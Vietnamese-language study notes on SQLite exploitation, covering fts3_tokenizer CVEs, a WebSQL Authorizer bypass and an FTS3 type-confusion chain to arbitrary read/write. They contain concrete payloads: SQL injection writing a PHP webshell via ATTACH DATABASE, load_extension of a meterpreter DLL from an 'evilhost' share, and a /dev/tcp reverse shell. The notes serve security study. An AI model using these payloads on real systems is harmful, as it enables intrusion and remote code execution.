# SQLite Security & Exploitation Notes
## Mục lục
- [1. Tổng quan về SQLite](#1-tổng-quan-về-sqlite)
- [2. Known Attacks on SQLite](#2-known-attacks-on-sqlite)
  - [2.1. ATTACH DATABASE → ghi file webshell](#21-attach-database--ghi-file-webshell)
  - [2.2. `SELECT load_extension()` → nạp mã native](#22-select-load_extension--nạp-mã-native)
  - [2.3. Fuzzing SQLite với các biểu thức/kiểu bất thường](#23-fuzzing-sqlite-với-các-biểu-thứckiểu-bất-thường)
- [3. Data Types trong SQLite](#3-data-types-trong-sqlite)
- [4. Virtual Table Mechanism](#4-virtual-table-mechanism)
- [5. Complex Features vs Simple Type System](#5-complex-features-vs-simple-type-system)
- [6. SQLite nguồn mở trả lời gì?](#6-sqlite-nguồn-mở-trả-lời-gì)
- [7. Case Study: CVE-2015-7036 (FTS3/FTS4 & tokenizer)](#7-case-study-cve-2015-7036-fts3fts4--tokenizer)
- [8. Web SQL Database (WebDatabase / WebSQL)](#8-web-sql-database-webdatabase--websql)
- [9. SQLite trong trình duyệt bị lọc (Authorizer)](#9-sqlite-trong-trình-duyệt-bị-lọc-authorizer)
- [10. Database Authorizer - whitelist](#10-database-authorizer--whitelist)
- [11. CVE-2015-3659 - Bypass Authorizer qua DEFAULT](#11-cve-2015-3659--bypass-authorizer-qua-default)
- [12. `fts3_tokenizer` - thực thi mã trên **trình duyệt**](#12-fts3_tokenizer--thực-thi-mã-trên-trình-duyệt)
- [13. `fts3_tokenizer` - thực thi mã trong **PHP**](#13-fts3_tokenizer--thực-thi-mã-trong-php)
- [14. Lỗi **Type Confusion** (nhầm lẫn kiểu dữ liệu)](#14-lỗi-type-confusion-nhầm-lẫn-kiểu-dữ-liệu)
  - [14.1. `fts3FunctionArg()` & `optimize()`](#141-fts3functionarg--optimize)
  - [14.2. FTS3 Tricks](#142-fts3-tricks)
  - [14.3. Ví dụ thực nghiệm Type Confusion](#143-ví-dụ-thực-nghiệm-type-confusion)
- [15. `invokeProfileCallback` và các đối số có thể kiểm soát](#15-invokeprofilecallback-và-các-đối-số-có-thể-kiểm-soát)
- [16. Hướng khai thác tổng quát](#16-hướng-khai-thác-tổng-quát)
- [17. Một chuỗi khai thác đạt **arbitrary R/W**](#17-một-chuỗi-khai-thác-đạt-arbitrary-rw)

---

## 1. Tổng quan về SQLite
SQLite là một engine cơ sở dữ liệu SQL **nhúng**, **độc lập** (không cần server), **nhẹ** nhưng đủ tính năng và dùng rất rộng rãi.

- **Storage backend for web browsers** - SQLite thường làm backend lưu trữ cục bộ cho trình duyệt (WebSQL/IndexedDB nội bộ).
- **Programming language binding** - Có binding cho nhiều ngôn ngữ (Python, PHP, Java, …), dễ tích hợp vào app.
- **Web database** - Hợp cho ứng dụng web nhỏ hoặc test, tránh cài đặt server DB phức tạp.
- **Embedded DB for mobile apps** - iOS/Android hay dùng để lưu dữ liệu cục bộ.
- **Database on IoT devices** - Nhẹ, yêu cầu tài nguyên thấp.

---

## 2. Known Attacks on SQLite

### 2.1. ATTACH DATABASE → ghi file webshell
```php
?id=bob'; ATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn(dataz) VALUES ('<? system($_GET['cmd']); ?>');--
```
- `ATTACH DATABASE '/var/www/lol.php' AS lol;` gắn một file làm “database” mới (alias `lol`). Nếu trỏ tới thư mục web (`/var/www/...`), có thể ghi nội dung vào file đó thông qua thao tác SQL kế tiếp.
- `CREATE TABLE lol.pwn (dataz text);` tạo bảng `pwn` bên trong database `lol` (tức là “ghi cấu trúc” vào file `.php`).
- `INSERT ... VALUES ('<? system($_GET['cmd']); ?>');` chèn nội dung PHP vào file; nếu web server thực thi, có thể dẫn tới **RCE**.

> Thực tế thường bị **chặn** trong môi trường trình duyệt/ứng dụng hiện đại bởi cơ chế Authorizer (xem thêm phần dưới).

<br>

### 2.2. `SELECT load_extension()` → nạp mã native
```sql
?name=123 UNION SELECT 1, load_extension('\evilhost\evilshare\meterpreter.dll','DllMain');--
```
- `load_extension(path, entry)` nạp **thư viện chia sẻ** (`.dll` / `.so`) và gọi hàm entry (ví dụ `DllMain`). Nếu thành công, mã native sẽ **chạy trong tiến trình** → có thể mở shell/nâng quyền.

> Hầu hết build/embedding **tắt** tính năng này mặc định hoặc bị Authorizer chặn.

<br>

### 2.3. Fuzzing SQLite với các biểu thức/kiểu bất thường
```sql
create table t0(o CHar(0) CHECK(0&0>0));
insert into t0;
select randomblob(0)-trim(0);
```
- Cột `CHAR(0)`, constraint `CHECK(0&0>0)`, phép toán trên kiểu/giá trị **phi chuẩn** buộc engine đi vào các **code path ít được test**, dẫn tới **crash** hoặc thậm chí **memory corruption**.

---

## 3. Data Types trong SQLite
SQLite dùng 5 kiểu cơ bản:
- **Integer** 64-bit có dấu  
- **Float** 64-bit IEEE  
- **String**
- **BLOB**
- **NULL**

Cơ chế **dynamic typing/type affinity**: cột có “kiểu tên” nhưng giá trị vẫn có thể lưu dạng khác; bản chất mọi thứ thuộc 1 trong 5 kiểu trên.

> **Lưu ý**: BLOB/String có thể chứa dữ liệu nhị phân/payload. **Validate** và **giới hạn kích thước** khi nhận input không tin cậy.

---

## 4. Virtual Table Mechanism
- Virtual table là đối tượng đăng ký vào một **connection**, không nhất thiết là file trên đĩa.
- Các thao tác sẽ gọi **callback** do extension cung cấp.
- Dùng để bọc dữ liệu ngoài/không theo định dạng SQLite, hoặc tính nội dung **on-demand**.

> Vì callback chạy **native**, bug/input độc hại có thể gây **crash**/**RCE** - coi extensions là **code không tin cậy**.

---

## 5. Complex Features vs Simple Type System
- Các extension phức tạp (FTS, R-Tree, session log, …) tự lưu dữ liệu vào các **bảng đặc biệt** ngay trong DB.
- Do SQLite chỉ có 5 kiểu nền tảng, dữ liệu phức tạp thường bị **nhét vào BLOB**.

**Vấn đề chính:**
- Làm sao biết “**kiểu gốc**” của một BLOB?
- Có nên **tin** BLOB lưu trong DB (file DB có thể bị **craft**)?

---

## 6. SQLite nguồn mở trả lời gì?
- Suy luận “kiểu gốc” của BLOB dựa vào **tên cột** hoặc **kiểu đối số hàm** khi đọc/giải mã.
- **Không nên** tin mù quáng dữ liệu trong BLOB - file DB craft có thể dẫn tới **type confusion/memory corruption** trong extension.

---

## 7. Case Study: CVE-2015-7036 (FTS3/FTS4 & tokenizer)
FTS3/FTS4 là module **virtual table** cho tìm kiếm toàn văn. **Tokenizer** tách term từ tài liệu/truy vấn. Ngoài tokenizer “simple”, FTS cho phép đăng ký **tokenizer tùy biến (C)**.

Đăng ký tokenizer qua **BLOB con trỏ** đi xuyên engine SQL bằng hàm đặc biệt:
```sql
SELECT fts3_tokenizer(<tokenizer-name>);
SELECT fts3_tokenizer(<tokenizer-name>, <sqlite3_tokenizer_module ptr>);
```

**Ví dụ REPL**
```text
sqlite> select hex(fts3_tokenizer('simple'));
60DDBEE2FF7F0000         -- hex của một CON TRỎ hợp lệ (tokenizer "simple")

sqlite> select fts3_tokenizer('mytokenizer', x'4141414142424242');
AAAABBBB                 -- chấp nhận BLOB do người dùng đưa vào làm con trỏ!

sqlite> select hex(fts3_tokenizer('mytokenizer'));
4141414142424242         -- con trỏ giờ = 0x4141... (“AAAA BBBB”)
```

**Hệ quả bảo mật**
- **Info leak**: trả về **địa chỉ** của tokenizer dưới dạng BLOB → leak base address (big-endian).
- **Untrusted pointer dereference**: đối số BLOB **không được kiểm tra** là con trỏ hợp lệ trước khi dereference.

---

## 8. Web SQL Database (WebDatabase / WebSQL)
API cho phép lưu dữ liệu bằng SQL (đa số dùng SQLite3). Dù **W3C đã ngừng** đặc tả, một số engine **WebKit/Blink** vẫn còn.

```js
var db = openDatabase('mydb', '1.0', 'Test DB', 2 * 1024 * 1024);

db.transaction(function(tx) {
  tx.executeSql('CREATE TABLE IF NOT EXISTS LOGS (id unique, log)');
  tx.executeSql('INSERT INTO LOGS (id, log) VALUES (1, "foobar")');
  tx.executeSql('INSERT INTO LOGS (id, log) VALUES (2, "logmsg")');
});

db.transaction(function(tx) {
  tx.executeSql('SELECT * FROM LOGS', [], function(tx, results) {
    var len = results.rows.length, i;
    for (i = 0; i < len; i++) {
      document.write("<p>" + results.rows.item(i).log + "</p>");
    }
  }, null);
});
```

- `openDatabase(name, version, displayName, size)` mở khởi tạo DB trong trình duyệt.
- `db.transaction(fn)` chạy transaction; `tx.executeSql(sql, params, success, error)` thực thi SQL.
- `results.rows.item(i)` đọc từng row.

---

## 9. SQLite trong trình duyệt bị lọc (Authorizer)
`sqlite3_set_authorizer()` đăng ký callback quyết định **cho phép/không** một hành động SQL:

```cpp
void SQLiteDatabase::enableAuthorizer(bool enable)
{
    if (m_authorizer && enable)
        sqlite3_set_authorizer(m_db, SQLiteDatabase::authorizerFunction, m_authorizer.get());
}
```

Trình duyệt dùng Authorizer để **chặn** lệnh nguy hiểm như `ATTACH DATABASE`, `load_extension()`, v.v.

---

## 10. Database Authorizer - whitelist
Chỉ hàm SQL trong **whitelist** mới được phép:

```cpp
int DatabaseAuthorizer::allowFunction(const String& functionName)
{
    if (m_securityEnabled && !m_whitelistedFunctions.contains(functionName))
        return SQLAuthDeny;
    return SQLAuthAllow;
}
```

Về **virtual table**, thường **chỉ cho phép FTS3**:
```cpp
int DatabaseAuthorizer::createVTable(const String& tableName, const String& moduleName)
{
    // Chỉ cho phép extension FTS3
    if (!equalLettersIgnoringASCIICase(moduleName, "fts3"))
        return SQLAuthDeny;
}
```

Muốn dùng `fts3_tokenizer()` trong trình duyệt cần **bypass** Authorizer.

---

## 11. CVE-2015-3659 - Bypass Authorizer qua DEFAULT
Dùng biểu thức `DEFAULT(...)` để buộc engine đánh giá một **hàm đặc quyền** ngay cả khi gọi trực tiếp bị chặn:

```js
var db = openDatabase(...);
var sql = "hex(fts3_tokenizer('simple'))";
db.transaction(function(tx) {
  tx.executeSql('DROP TABLE IF EXISTS BAD;');
  tx.executeSql('CREATE TABLE BAD(id, x DEFAULT(' + sql + '));'); // <-- bypass
  tx.executeSql('INSERT INTO BAD(id) VALUES (1);');
  tx.executeSql('SELECT x FROM BAD LIMIT 1;', [], function(tx, results) {
    var val = results.rows.item(0).x;
  });
}, function(err) { log(err.message) });
```

**Ý tưởng**: `DEFAULT` khiến engine **tự đánh giá** biểu thức khi `INSERT`, từ đó chạy hàm vốn **bị chặn** nếu gọi trực tiếp.

---

## 12. `fts3_tokenizer` - thực thi mã trên **trình duyệt**
- SQLite3 được **link tĩnh** trong WebKit, nên `select fts3_tokenizer('simple')` có thể **leak base** của WebKit/SQLite.
- Từ leak đó tính các địa chỉ quan trọng.
- Có thể **spray** cấu trúc `sqlite3_tokenizer_module`, chỉnh callback (`xCreate`) → control-flow hijack.

---

## 13. `fts3_tokenizer` - thực thi mã trong **PHP**
- Trên LAMP, `libphp` và `libsqlite3` thường là **shared libraries**. Từ leak có thể suy ra **memory map**.
- Spray cấu trúc `sqlite3_tokenizer_module` giả; dùng `select fts3_tokenizer('simple', x'...')` để **dereference** con trỏ attacker-controlled.
- Dùng **one-gadget** trong PHP để bật shell.

Ví dụ ý tưởng chuỗi SQL:
```sql
$db->exec("select fts3_tokenizer('simple', x'$spray_address');
           create virtual table a using fts3;
           insert into a values('bash -c "bash>/dev/tcp/127.1/1337 0<&1"')");
```

Minh họa (assembly rút gọn):
```asm
mov rbx, rsi
lea rsi, [modes]
sub rsp, 0x58
mov rdi, rbx      ; command
call _popen
```

> Ghi chú: **Android** đã loại bỏ/khóa tính năng `fts3_tokenizer`. Từ **SQLite 3.11**, hàm này không hoạt động trừ khi bật khi biên dịch.

---

## 14. Lỗi **Type Confusion** (nhầm lẫn kiểu dữ liệu)

### 14.1. `fts3FunctionArg()` & `optimize()`
Hàm xử lý đối số cho các hàm đặc biệt của FTS3:
```c
static int fts3FunctionArg(
  sqlite3_context *pContext,
  const char *zFunc,
  sqlite3_value *pVal,
  Fts3Cursor **ppCsr
){
  Fts3Cursor *pRet;
  if( sqlite3_value_type(pVal)!=SQLITE_BLOB 
   || sqlite3_value_bytes(pVal)!=sizeof(Fts3Cursor *)
  ){
    char *zErr = sqlite3_mprintf("đối số thứ nhất không hợp lệ cho %s", zFunc);
    sqlite3_result_error(pContext, zErr, -1);
    sqlite3_free(zErr);
    return SQLITE_ERROR;
  }
  memcpy(&pRet, sqlite3_value_blob(pVal), sizeof(Fts3Cursor *));
  *ppCsr = pRet;
  return SQLITE_OK;
}
```

Nếu kẻ tấn công ép kiểu/giả mạo **BLOB** để trông như một **con trỏ**, có thể dẫn đến **type confusion** khi dereference.

Hàm `fts3OptimizeFunc`:
```c
static void fts3OptimizeFunc(
    sqlite3_context *pContext,
    int nVal,
    sqlite3_value **apVal
){
    int rc;
    Fts3Table *p;
    Fts3Cursor *pCursor;

    if( fts3FunctionArg(pContext, "optimize", apVal[0], &pCursor) )
        return;

    p = (Fts3Table *)pCursor->base.pVtab;
    rc = sqlite3Fts3Optimize(p);
    ...
}
```

### 14.2. FTS3 Tricks
- Virtual table có `xColumn(sqlite3_vtab_cursor*, sqlite3_context*, int N)` tùy biến.
- FTS3 cho phép **tên bảng** như **tên cột**; vài hàm nhận **tên bảng** làm đối số đầu tiên.  
  Ví dụ: `SELECT optimize(t) FROM t LIMIT 1;`

### 14.3. Ví dụ thực nghiệm Type Confusion
```text
SQLite version 3.14.0 2016-07-26 15:17:14
sqlite> create virtual table a using fts3(b);
sqlite> insert into a values(x'4141414142424242');
sqlite> select hex(a) from a;
C854D98F08560000
sqlite> select optimize(b) from a;
[1]    37515 segmentation fault  sqlite3
```

---

## 15. `invokeProfileCallback` và các đối số có thể kiểm soát
```c
static SQLITE_NOINLINE void invokeProfileCallback(sqlite3 *db, Vdbe *p){
   sqlite3_int64 iNow;
   sqlite3_int64 iElapse;
   ...
   sqlite3OsCurrentTimeInt64(db->pVfs, &iNow);
   iElapse = (iNow - p->startTime)*1000000;
   if( db->xProfile ){
     db->xProfile(db->pProfileArg, p->zSql, iElapse);
   }
   if( db->mTrace & SQLITE_TRACE_PROFILE ){
     db->xTrace(SQLITE_TRACE_PROFILE, db->pTraceArg, p, (void*)&iElapse);
   }
   p->startTime = 0;
}
```
Ý tưởng: Có những callback (profile/trace) nhận **đối số** từ cấu trúc `db`/`p`, đôi khi có thể bị ảnh hưởng trong chuỗi khai thác.

---

## 16. Hướng khai thác tổng quát
1. **Heap spray** (JS/ArrayBuffer hoặc tương đương) để có vùng nhớ **kiểm soát**.
2. Dựng **fake struct** (`Fts3Cursor`, `Fts3Table`, …) trong vùng đã spray.
3. Dẫn luồng qua các **code path** như `optimize/offsets/matchinfo()` để đạt **arbitrary read/write** hoặc **PC control**.

---

## 17. Một chuỗi khai thác đạt **arbitrary R/W**
Đồ thị gọi hàm tóm tắt:
```
fts3OptimizeFunc → sqlite3Fts3Optimize → sqlite3Fts3SegmentsClose → sqlite3_blob_close → sqlite3_finalize → sqlite3VdbeFinalize → sqlite3VdbeReset → sqlite3ValueSetStr → sqlite3VdbeMemSetStr
```

Một số đoạn then chốt:
```c
int sqlite3Fts3Optimize(Fts3Table *p){
    int rc;
    rc = sqlite3_exec(p->db, "SAVEPOINT fts3", 0, 0, 0);
    if( rc==SQLITE_OK ){
        rc = fts3DoOptimize(p, 1);
        if( rc==SQLITE_OK || rc==SQLITE_DONE ){
            int rc2 = sqlite3_exec(p->db, "RELEASE fts3", 0, 0, 0);
            if( rc2!=SQLITE_OK ) rc = rc2;
        }else{
            sqlite3_exec(p->db, "ROLLBACK TO fts3", 0, 0, 0);
            sqlite3_exec(p->db, "RELEASE fts3", 0, 0, 0);
        }
    }
    sqlite3Fts3SegmentsClose(p);
    return rc;
}
```

```c
void sqlite3Fts3SegmentsClose(Fts3Table *p){
    sqlite3_blob_close(p->pSegments);
    p->pSegments = 0;
}

int sqlite3_blob_close(sqlite3_blob *pBlob){
    Incrblob *p = (Incrblob *)pBlob;
    int rc;
    sqlite3 *db;

    if( p ){
        db = p->db;
        sqlite3_mutex_enter(db->mutex);
        rc = sqlite3_finalize(p->pStmt);
        sqlite3DbFree(db, p);
        sqlite3_mutex_leave(db->mutex);
    }else{
        rc = SQLITE_OK;
    }
    return rc;
}
```

```c
int sqlite3_finalize(sqlite3_stmt *pStmt){
    int rc;
    if( pStmt==0 ){
        rc = SQLITE_OK;
    }else{
        Vdbe *v = (Vdbe*)pStmt;
        sqlite3 *db = v->db;

        if( vdbeSafety(v) ) return SQLITE_MISUSE_BKPT;
        sqlite3_mutex_enter(db->mutex);
        checkProfileCallback(db, v);
        rc = sqlite3VdbeFinalize(v);
        sqlite3LeaveMutexAndCloseZombie(db);
    }
    return rc;
}
```

```c
int sqlite3VdbeFinalize(Vdbe *p){
    int rc = SQLITE_OK;
    if( p->magic==VDBE_MAGIC_RUN || p->magic==VDBE_MAGIC_HALT ){
        rc = sqlite3VdbeReset(p);
        assert( (rc & p->db->errMask) == rc );
    }
    sqlite3VdbeDelete(p);
    return rc;
}
```

```c
int sqlite3VdbeReset(Vdbe *p){
    sqlite3 *db = p->db;
    sqlite3VdbeHalt(p);
    if( p->pc >= 0 ){
        vdbeInvokeSqllog(p);
        sqlite3VdbeTransferError(p);
        sqlite3DbFree(db, p->zErrMsg);
        p->zErrMsg = 0;
        if( p->runOnlyOnce ) p->expired = 1;
    }
    Cleanup(p);
    p->iCurrentTime = 0;
    p->magic = VDBE_MAGIC_RESET;
    return p->rc & db->errMask;
}
```

**Ý tưởng**: Tận dụng chuỗi dọn dẹp/chuẩn hoá nội bộ để biến thành các **primitive copy/ghi/đọc** với con trỏ/độ dài do attacker ảnh hưởng.

---

